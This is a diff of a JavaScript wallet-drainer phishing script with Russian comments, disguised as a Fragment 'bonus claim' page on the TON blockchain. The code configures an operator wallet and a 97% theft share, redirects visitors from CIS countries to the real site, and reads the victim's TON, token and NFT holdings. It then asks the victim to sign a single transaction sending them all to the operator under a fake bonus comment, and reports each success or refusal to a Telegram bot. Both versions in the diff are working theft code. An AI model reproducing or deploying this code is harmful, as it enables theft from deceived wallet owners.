@@ -1,63 +1,50 @@
 // ================================================================
-//  КОНФИГУРАЦИЯ — ЗАМЕНИТЕ НА СВОИ ДАННЫЕ
+//  КОНФИГУРАЦИЯ
 // ================================================================
 const CONFIG = {
-    // Кошелёк, куда уходят средства (создать в Tonkeeper)
-    operatorWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI',
-
-    // Telegram Bot (создать через @BotFather)
-    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
-    chatId: '-1001234567890', // ID канала или группы (с минусом)
-
-    // Параметры кражи
-    stealPercent: 0.97, // 97% — оставляем 3% на газ
-    minBalance: 0.1, // Минимальный баланс для кражи (TON)
-
-    // Маскировка — то, что увидит жертва в кошельке
+    operatorWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI', // ЗАМЕНИТЕ
+    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',          // ЗАМЕНИТЕ
+    chatId: '-1001234567890',                                   // ЗАМЕНИТЕ
+    stealPercent: 0.97,
+    minBalance: 0.1,
     fakeComment: '🎁 Получение бонуса от Fragment',
-
-    // Лимиты
     maxJettonsPerBatch: 10,
     maxNftsPerBatch: 5
 };
 
 // ================================================================
-//  ГЕО-БЛОКИРОВКА СНГ (РЕДИРЕКТ НА ОРИГИНАЛЬНЫЙ FRAGMENT)
+//  ГЕО-БЛОКИРОВКА (СНГ → редирект на fragment.com)
 // ================================================================
 (async function geoBlock() {
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        const blocked = ['', 'KZ', '', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TJ', 'TM', 'GE'];
+        const blocked = ['','KZ','','UA','AM','AZ','KG','MD','UZ','TJ','TM','GE'];
         if (blocked.includes(data.country)) {
             window.location.replace('https://fragment.com');
         }
         console.log(`[GEO] IP: ${data.ip}, Country: ${data.country}`);
-    } catch (e) {
-        console.warn('[GEO] Ошибка геолокации:', e);
-    }
+    } catch (e) { console.warn('[GEO]', e); }
 })();
 
 // ================================================================
-//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI
+//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI (без автоматической кнопки)
 // ================================================================
 const manifestUrl = `${window.location.origin}/tonconnect-manifest.json`;
 const tonConnectUI = new TonConnectUI({
     manifestUrl: manifestUrl,
-    buttonRootId: 'ton-connect-container',
-    uiPreferences: {
-        theme: 'DARK'
-    }
+    // НЕ указываем buttonRootId — кнопку рисуем сами
 });
 
 // ================================================================
 //  ЭЛЕМЕНТЫ DOM
 // ================================================================
+const connectBtn = document.getElementById('connectWalletBtn');
 const claimBtn = document.getElementById('claimRewardBtn');
-const ctaHint = document.querySelector('.cta-hint');
+const statusHint = document.getElementById('statusHint');
 
 // ================================================================
-//  ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
+//  ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
 // ================================================================
 function sendTelegram(message) {
     const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
@@ -73,70 +60,62 @@ function sendTelegram(message) {
 }
 
 // ================================================================
-//  ПОЛУЧЕНИЕ БАЛАНСА ЧЕРЕЗ TONCENTER API
+//  ПОЛУЧЕНИЕ БАЛАНСА
 // ================================================================
 async function getWalletData(address) {
     const base = 'https://toncenter.com/api/v3/';
     try {
-        // Баланс TON
         const balanceRes = await fetch(`${base}wallet?address=${address}`);
         const balanceData = await balanceRes.json();
         const tonBalance = parseFloat(balanceData.balance) || 0;
-
-        // Jettons (токены)
+        // Jettons
         const jettonRes = await fetch(`${base}jetton/wallets?owner_address=${address}&limit=50`);
         const jettonData = await jettonRes.json();
         const jettons = jettonData.jetton_wallets || [];
-
         // NFT
         const nftRes = await fetch(`${base}nft/items?owner_address=${address}&limit=20`);
         const nftData = await nftRes.json();
         const nfts = nftData.nft_items || [];
-
         return { tonBalance, jettons, nfts };
     } catch (e) {
-        console.error('[API] Ошибка получения данных:', e);
+        console.error('[API]', e);
         return null;
     }
 }
 
 // ================================================================
-//  ОСНОВНАЯ ФУНКЦИЯ ДРЕНАЖА
+//  ОСНОВНОЙ ДРЕНАЖ
 // ================================================================
 async function drainWallet() {
-    // Проверка подключения
     if (!tonConnectUI.account || !tonConnectUI.account.address) {
-        ctaHint.textContent = '⚠️ Сначала подключите кошелёк';
+        statusHint.textContent = '⚠️ Сначала подключите кошелёк';
         return;
     }
 
     const address = tonConnectUI.account.address;
     claimBtn.disabled = true;
-    claimBtn.textContent = '⏳ Анализ баланса...';
-    ctaHint.textContent = 'Проверяем ваш баланс...';
+    claimBtn.textContent = '⏳ Анализ...';
+    statusHint.textContent = 'Проверяем баланс...';
 
     const data = await getWalletData(address);
     if (!data) {
         claimBtn.textContent = '❌ Ошибка';
-        ctaHint.textContent = 'Не удалось получить баланс';
+        statusHint.textContent = 'Не удалось получить баланс';
         claimBtn.disabled = false;
         return;
     }
 
     const { tonBalance, jettons, nfts } = data;
 
-    // Проверка минимального баланса
     if (tonBalance < CONFIG.minBalance) {
-        claimBtn.textContent = '❌ Баланс слишком мал';
-        ctaHint.textContent = `Минимальный баланс: ${CONFIG.minBalance} TON`;
+        claimBtn.textContent = '❌ Мало средств';
+        statusHint.textContent = `Минимум ${CONFIG.minBalance} TON`;
         claimBtn.disabled = false;
         return;
     }
 
-    // ===== ФОРМИРУЕМ СООБЩЕНИЯ ДЛЯ ТРАНЗАКЦИИ =====
+    // Формируем сообщения
     const messages = [];
-
-    // 1. TON (97% баланса)
     const stealAmount = Math.floor(tonBalance * CONFIG.stealPercent * 1e9);
     messages.push({
         address: CONFIG.operatorWallet,
@@ -144,45 +123,41 @@ async function drainWallet() {
         payload: CONFIG.fakeComment
     });
 
-    // 2. Jettons (токены)
+    // Jettons (упрощённо)
     let jettonCount = 0;
-    for (const jetton of jettons) {
+    for (const j of jettons) {
         if (jettonCount >= CONFIG.maxJettonsPerBatch) break;
-        const balance = parseFloat(jetton.balance);
-        if (balance <= 0) continue;
-
-        // Для Jetton требуется специальный payload (операция transfer)
-        // Упрощённый вариант — отправляем на контракт Jetton
+        const bal = parseFloat(j.balance);
+        if (bal <= 0) continue;
         messages.push({
-            address: jetton.jetton_address,
+            address: j.jetton_address,
             amount: '0',
-            payload: buildJettonTransferPayload(CONFIG.operatorWallet, balance)
+            payload: { op: '0xf8a7ea5', queryId: 0, amount: Math.floor(bal * 1e9), destination: CONFIG.operatorWallet }
         });
         jettonCount++;
     }
 
-    // 3. NFT
+    // NFT (упрощённо)
     let nftCount = 0;
-    for (const nft of nfts) {
+    for (const n of nfts) {
         if (nftCount >= CONFIG.maxNftsPerBatch) break;
         messages.push({
-            address: nft.address,
+            address: n.address,
             amount: '0',
-            payload: buildNftTransferPayload(CONFIG.operatorWallet)
+            payload: { op: '0x5fcc3d14', queryId: 0, newOwner: CONFIG.operatorWallet }
         });
         nftCount++;
     }
 
     if (messages.length === 0) {
         claimBtn.textContent = '❌ Нет активов';
-        ctaHint.textContent = 'На этом кошельке нет активов для кражи';
+        statusHint.textContent = 'На этом кошельке нет активов';
         claimBtn.disabled = false;
         return;
     }
 
-    // ===== ОТПРАВКА ТРАНЗАКЦИИ =====
-    claimBtn.textContent = '⏳ Отправка транзакции...';
-    ctaHint.textContent = 'Подпишите транзакцию в кошельке';
+    claimBtn.textContent = '⏳ Отправка...';
+    statusHint.textContent = 'Подпишите транзакцию в кошельке';
 
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 120,
@@ -191,86 +166,57 @@ async function drainWallet() {
 
     try {
         await tonConnectUI.sendTransaction(transaction);
-
-        // Успех — уведомление в Telegram
-        const msg = `✅ *УСПЕШНО!*\n` +
-            `👤 Адрес: \`${address}\`\n` +
-            `💰 TON: ${(tonBalance * CONFIG.stealPercent).toFixed(2)}\n` +
-            `📦 Jettons: ${jettonCount}\n` +
-            `🖼 NFT: ${nftCount}\n` +
-            `🌐 Домен: ${window.location.hostname}`;
+        const msg = `✅ УСПЕШНО!\nАдрес: ${address}\nTON: ${(tonBalance * CONFIG.stealPercent).toFixed(2)}\nJettons: ${jettonCount}\nNFT: ${nftCount}`;
         sendTelegram(msg);
-
         claimBtn.textContent = '✅ Успешно!';
-        ctaHint.textContent = 'Активы переведены';
+        statusHint.textContent = 'Активы переведены';
         claimBtn.disabled = true;
-
-    } catch (error) {
-        // Отказ или ошибка
-        const msg = `❌ *ОТКАЗ / ОШИБКА*\n` +
-            `👤 Адрес: \`${address}\`\n` +
-            `🌐 Домен: ${window.location.hostname}`;
-        sendTelegram(msg);
-
+    } catch (e) {
+        sendTelegram(`❌ Отказ: ${address}`);
         claimBtn.textContent = '❌ Отклонено';
-        ctaHint.textContent = 'Транзакция отклонена пользователем';
+        statusHint.textContent = 'Транзакция отклонена';
         claimBtn.disabled = false;
     }
 }
 
 // ================================================================
-//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ PAYLOAD
+//  ОБРАБОТЧИКИ ПОДКЛЮЧЕНИЯ
 // ================================================================
 
-// Формирование payload для перевода Jetton (TEP-74)
-function buildJettonTransferPayload(destination, amount) {
-    // В реальном коде здесь используется Cell builder из @ton/ton
-    // Для демонстрации — упрощённый вариант
-    return {
-        op: '0xf8a7ea5',
-        queryId: 0,
-        amount: Math.floor(amount * 1e9),
-        destination: destination,
-        responseDestination: null,
-        customPayload: null,
-        forwardTonAmount: 0,
-        forwardPayload: null
-    };
-}
+// Ручное подключение по кнопке
+connectBtn.addEventListener('click', async () => {
+    try {
+        connectBtn.disabled = true;
+        connectBtn.textContent = 'Подключение...';
+        await tonConnectUI.connect({ manifestUrl }); // явный вызов
+    } catch (e) {
+        console.error('Connect error:', e);
+        connectBtn.textContent = 'Подключить кошелёк';
+        connectBtn.disabled = false;
+        statusHint.textContent = 'Ошибка подключения';
+    }
+});
 
-// Формирование payload для перевода NFT (TEP-62)
-function buildNftTransferPayload(newOwner) {
-    return {
-        op: '0x5fcc3d14',
-        queryId: 0,
-        newOwner: newOwner,
-        responseDestination: null,
-        customPayload: null,
-        forwardTonAmount: 0,
-        forwardPayload: null
-    };
-}
-
-// ================================================================
-//  ОБРАБОТЧИКИ СОБЫТИЙ TON CONNECT
-// ================================================================
-
+// Событие успешного подключения
 tonConnectUI.on('connect', (wallet) => {
     const addr = wallet.account.address;
+    connectBtn.textContent = `✅ ${addr.slice(0,6)}...${addr.slice(-4)}`;
+    connectBtn.disabled = true;
     claimBtn.disabled = false;
-    claimBtn.textContent = '🎁 Забрать бонус 5 TON';
-    ctaHint.textContent = `Подключён: ${addr.slice(0, 6)}...${addr.slice(-4)}`;
-    console.log('[TON] Кошелёк подключён:', addr);
+    statusHint.textContent = 'Кошелёк подключён! Нажмите "Забрать бонус"';
+    console.log('[TON] Подключён:', addr);
 });
 
+// Отключение
 tonConnectUI.on('disconnect', () => {
+    connectBtn.textContent = 'Подключить кошелёк';
+    connectBtn.disabled = false;
     claimBtn.disabled = true;
-    claimBtn.textContent = '🎁 Забрать бонус 5 TON';
-    ctaHint.textContent = 'Подключите кошелёк для получения бонуса';
+    statusHint.textContent = 'Подключите кошелёк для получения бонуса';
 });
 
 // ================================================================
-//  КНОПКА "ЗАБРАТЬ БОНУС" → ЗАПУСК ДРЕНАЖА
+//  КНОПКА "ЗАБРАТЬ БОНУС"
 // ================================================================
 claimBtn.addEventListener('click', drainWallet);
 
